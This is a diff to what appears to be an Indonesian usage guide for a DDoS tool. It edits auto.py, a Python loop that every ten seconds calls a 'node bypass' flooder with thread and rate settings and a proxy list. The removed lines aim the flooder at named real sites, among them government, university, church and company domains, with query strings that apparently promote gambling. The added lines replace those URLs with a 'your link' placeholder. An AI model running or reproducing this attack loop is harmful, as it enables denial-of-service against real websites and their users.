@@ -45,7 +45,7 @@ python3 scrape.py
 
 
 PERINTAH UNTUK MASUKIN LIST DDOS
->>> nano auto.py
+nano auto.py
 
 
 
@@ -53,19 +53,19 @@ import os
 import time
 
 while True:
-    os.system("node bypass https://sipintar.kaltimprov.go.id/foto/?or_id=pialasport 120 64 10 proxy.txt")
-    os.system("node bypass https://jdih.institutpendidikan.ac.id/PIALASPORT 120 64 10 proxy.txt")
-    os.system("node bypass https://cjlm.org/styles/?web=PIALASPORT 120 64 10 proxy.txt")
-    os.system("node bypass http://sysbpr.simgroup.co.id/intranet/storage/billing/?web=pialasport 120 64 10 proxy.txt")
-    os.system("node bypass https://okukab.go.id/?id_=PIALASPORT 120 64 10 proxy.txt")
-    os.system("node bypass https://lppm.upstegal.ac.id/?id=PIALABET 120 64 10 proxy.txt")
-    os.system("node bypass https://gkkbpontianak.org/doa/?web=pialabet 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
+    os.system("node bypass Link kamu 120 64 10 proxy.txt")
     time.sleep(10)
 
 	
 	
-	Jika selesai 
-	>>> CTRL + X + Y ( Jika ganti ) ( Jika tidak cukup CTRL +Y )
+Jika selesai 
+CTRL + X + Y ( Jika ganti ) ( Jika tidak cukup CTRL +Y )
 	
 	
 
